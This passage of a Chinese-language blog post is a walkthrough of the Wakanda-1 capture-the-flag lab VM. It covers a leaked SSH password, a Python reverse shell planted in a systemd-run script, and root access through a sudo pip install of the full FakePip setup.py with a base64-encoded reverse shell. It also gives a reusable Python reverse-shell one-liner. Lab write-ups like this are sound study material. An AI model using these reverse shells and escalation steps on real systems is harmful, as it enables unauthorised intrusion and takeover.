charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;    &lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&gt;    &lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&gt;    &lt;title&gt;Vibranium Market&lt;/title&gt;    &lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;    &lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&gt;   &lt;/head&gt;  &lt;body class=&quot;text-center&quot;&gt;    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;      &lt;header class=&quot;masthead mb-auto&quot;&gt;        &lt;div class=&quot;inner&quot;&gt;          &lt;h3 class=&quot;masthead-brand&quot;&gt;Vibranium Market&lt;/h3&gt;          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;          &lt;/nav&gt;        &lt;/div&gt;      &lt;/header&gt;      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;        &lt;p class=&quot;lead&quot;&gt;          &lt;?php            if (isset($_GET[&#39;lang&#39;]))          {          echo $message;          }          else          {            ?&gt;            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!            &lt;?php          }?&gt;        &lt;/p&gt;        &lt;p class=&quot;lead&quot;&gt;          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;Learn more&lt;/a&gt;        &lt;/p&gt;      &lt;/main&gt;      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;        &lt;div class=&quot;inner&quot;&gt;          &lt;p&gt;Made by&lt;a href=&quot;#&quot;&gt;@mamadou&lt;/a&gt;&lt;/p&gt;        &lt;/div&gt;      &lt;/footer&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>​    oh！get到一个password：Niamey4Ever227!!!</p><p>​    到现在，我们收集到了作者的名称 mamadou，开放在3333端口的ssh服务，然后一个password。</p><hr><h3 id="2-开始渗透靶机"><a href="#2-开始渗透靶机" class="headerlink" title="2.开始渗透靶机"></a>2.开始渗透靶机</h3><p>​    二话不说，用ssh试试远程登录靶机：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> 192.168.1.108 -l mamadou -p 3333</code></pre><p>​    输入Niamey4Ever227!!!作为密码登录，两秒之后，弹出来一个python shell界面？见识短浅见识短浅，试试用python的pty把完全交互式的终端弄出来。</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pty <span class="token keyword">import</span> spawn<span class="token operator">>></span><span class="token operator">></span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>mamadou@Wakanda1<span class="token punctuation">:</span><span class="token operator">~</span>$ </code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f067fc33.png" class="lazyload"></p><p>​    问题不大，ls看一下目录，看到了我们要找的第一个flag,也就是flag1.txt，然后cat flag1.txt ==&gt; Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</p><p>​    接下来就是找一下flag2.txt了，到上级目录看到了另外一个用户 devops 的目录，进去看看找到了flag2.txt，但是没有权限，需要以devops的身份打开。</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f0ef1687.png" class="lazyload"></p><p>​    去别的目录逛一逛，果然/tmp目录下是有点东西的，但是只是一个test文件，里面含有一个‘test’字符串，并没有什么不同。</p><p>​    看看跟devops有关系的文件有哪些:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f16aa291.png" class="lazyload"></p><p>​    第一个还是仅有的一个就是一个python脚本的样子（忽略后面的setup.py，因为是做完之后写的文章，setup.py是后面我弄进去的文件），看看.antivirus.py内容是啥:</p><pre class=" language-python"><code class="language-python">open<span class="token punctuation">(</span><span class="token string">'/tmp/test'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span></code></pre><p>​    就一行，和test扯上了关系，往之前/tmp/目录下的test文件写入‘test’字符串。这个python脚本是可写的，我能将shell写入其中并且运行，但是反弹的用户却仍然是mamadou，而不是想要的devops，问题在哪呢？思考很久，查了下antivirus的意思’抗生素’，没啥用。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.antivirus.py--payload</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.1.107'</span><span class="token punctuation">,</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/bin/bash'</span><span class="token punctuation">,</span><span class="token string">'-i'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>​    后来经人点拨，恍然大悟，如果这个脚本是会自动运行的，那么就不会反弹mamadou权限的shell了，而是它本身具有的devops权限，而经过查询资料，了解到存放在/src目录下的一般为系统服务类脚本文件，那么它自动运行的假设就显然可以成立了（我还是对有些性质不够了解）。</p><pre><code>#用此命令查看.antivirus.py是否自动运行mamadou@Wakanda1:/srv$ grep -R .antivirus.py / 2&gt;/dev/null/lib/systemd/system/antivirus.service:ExecStart=/usr/bin/env python /srv/.antivirus.py#确实在自动运行，查看一下antivirus.service文件[Unit]Description=AntivirusAfter=network.targetStartLimitIntervalSec=0[Service]Type=simpleRestart=alwaysRestartSec=300User=devopsExecStart=/usr/bin/env python /srv/.antivirus.py[Install]WantedBy=multi-user.target#可以看到是每300秒执行一次</code></pre><p>​    那么接下来，写入的shell原封不动，kali攻击机nc监听7777端口，等待.antivirus.py自动运行(一分一秒地等待总是漫长的）。</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f341619f.png" class="lazyload"></p><p>​    果不其然，获得了反弹devops权限的shell，那么cat flag2.txt ==&gt;Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</p><p>​    那么下一步就是拿下root权限，攻入root目录了。</p><hr><h3 id="3-攻破root"><a href="#3-攻破root" class="headerlink" title="3.攻破root"></a>3.攻破root</h3><p>​    先看看devops用户权限大概是怎样的, 执行sudo -l命令：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f44d2154.png" class="lazyload"></p><p>​    然而，只有一个pip命令是可以不需要root权限就能执行的，试试pip install falsk，没问题。</p><p>​    那么怎样才能通过pip来获取root权限呢？这里用到一个github上的开源脚本Fakepip。这个脚本通过在pip重新安装时执行的setup.py文件中插入shellcode，导致其可通过pip反弹root权限的shell给攻击机。项目地址(<a href="https://github.com/0x00-0x00/FakePip.git" target="_blank" rel="noopener">https://github.com/0x00-0x00/FakePip.git</a>)</p><p>​    接下来在攻击机上把Fakepip给git下来,然后进入Fakepip目录,将setup.py中的RHOST参数改为攻击机地址:192.168.1.107,然后启动python的简易服务器。</p><pre><code>from setuptools import setupfrom setuptools.command.install import installimport base64import osclass CustomInstall(install):  def run(self):    install.run(self)    RHOST = &#39;192.168.1.107&#39;  # change this    reverse_shell = &#39;python -c &quot;import os; import pty; import socket; lhost = \&#39;%s\&#39;; lport = 443; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\&#39;HISTFILE\&#39;, \&#39;/dev/null\&#39;); pty.spawn(\&#39;/bin/bash\&#39;); s.close();&quot;&#39; % RHOST    encoded = base64.b64encode(reverse_shell)    os.system(&#39;echo %s|base64 -d|bash&#39; % encoded)setup(name=&#39;FakePip&#39;,      version=&#39;0.0.1&#39;,      description=&#39;This will exploit a sudoer able to /usr/bin/pip install *&#39;,      url=&#39;https://github.com/0x00-0x00/fakepip&#39;,      author=&#39;zc00l&#39;,      author_email=&#39;andre.marques@esecurity.com.br&#39;,      license=&#39;MIT&#39;,      zip_safe=False,      cmdclass={&#39;install&#39;: CustomInstall})</code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f5460351.png" class="lazyload"></p><p>​    然后在devops靶机上用<code>wget http://192.168.1.107/setup.py</code> 将攻击机上的setup.py下载到本地，攻击机kali开始用nc监听443端口，准备接收即将到来的shell。</p><p>​    在devops靶机上命令pip重装：<code>sudo pip install ./ --upgrade --force-install</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f60ece0f.png" class="lazyload"></p><p>​    kali兴奋地一把接到反弹过来的shell：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f65ea5ee.png" class="lazyload"></p><p><code>cd root</code> ,然后<code>cat root.txt</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f7108f3e.png" class="lazyload"></p><p>​    萌新的渗透到此暂停emmmm。</p><hr><h2 id="0x01-小知识"><a href="#0x01-小知识" class="headerlink" title="0x01 小知识"></a>0x01 小知识</h2><hr><h3 id="nmap-plus"><a href="#nmap-plus" class="headerlink" title="nmap plus"></a>nmap plus</h3><p>1.特殊扫描方式 ==&gt; nmap -sV/-sP/-sS/sL  其中-sP是用于扫描IP段的</p><p>2.详细地扫描目标：</p><p>nmap -sV 或者 nmap -p- -A  &lt;目标ip&gt;</p><p>或者超强力的： nmap -sS -sV  -A  -p- &lt;目标ip&gt;</p><hr><h3 id="python-反弹shell-amp-pip-get-shell"><a href="#python-反弹shell-amp-pip-get-shell" class="headerlink" title="python 反弹shell &amp; pip get shell"></a>python 反弹shell &amp; pip get shell</h3><p>python 反弹 shell:</p><pre class=" language-bash"><code class="language-bash">python -c <span class="token string">"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</span>192.168.1.107<span class="token string">",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["</span>/bin/sh<span class="token string">","</span>-i<span class="token string">"]);"</span></code></pre><p>python构造完全交互式终端 :</p><pre class=" language-bash"><code class="language-bash"> python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span></code></pre><hr><h3 id="php-filter-and-input-–LFI本地文件包含漏洞"><a href="#php-filter-and-input-–LFI本地文件包含漏洞" class="headerlink" title="php filter and input –LFI本地文件包含漏洞"></a>php filter and input –LFI本地文件包含漏洞</h3><p>参考 <a href="https://blog.csdn.net/qq_35544379/article/details/78230629" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629</a></p><p>php://filter,php://input,php://output都是有妙用的哦！</p><hr><h3 id="msfvenom-p-生成shell"><a href="#msfvenom-p-生成shell" class="headerlink" title="msfvenom -p   生成shell"></a>msfvenom -p   生成shell</h3><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f84ea8cc.png" class="lazyload"></p><p>​    但在渗透过程中发现，不用msfvenom生成的加密shell也能成功反弹，不过还是要养成好习惯，多用用这种神器提高效率并且准确率。</p><p>参考链接 <a href="https://www.cnblogs.com/xishaonian/p/6851475.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6851475.html</a></p><hr><h3 id="linux-中的一些命令与特性"><a href="#linux-中的一些命令与特性" class="headerlink" title="linux 中的一些命令与特性"></a>linux 中的一些命令与特性</h3><p>==&gt; su &amp; sudo </p><p>可用于切换用户</p><p>==&gt; lsattr 是 ls的升级版，就如aptitude 与apt相似一样</p><p>==&gt; find / -user root 2&gt;/dev/null 查看用户属性为root的文件</p><p>==&gt;ps -aux 查看所有服务  ==&gt;top 查看进程</p><hr><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>​    渗透一定一定注意信息收集，思维拓展，然后就是扎实的基础！</p><p>​    如果没有那么强的能力，渗透确实有点吃力，但是吃力的过程也在进步，就像不停的被虐的过程，自然自己的等级也在提高，不停地膜大神的文章的同时，自己也会受其影响，作为老腊肉，只能继续学习。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
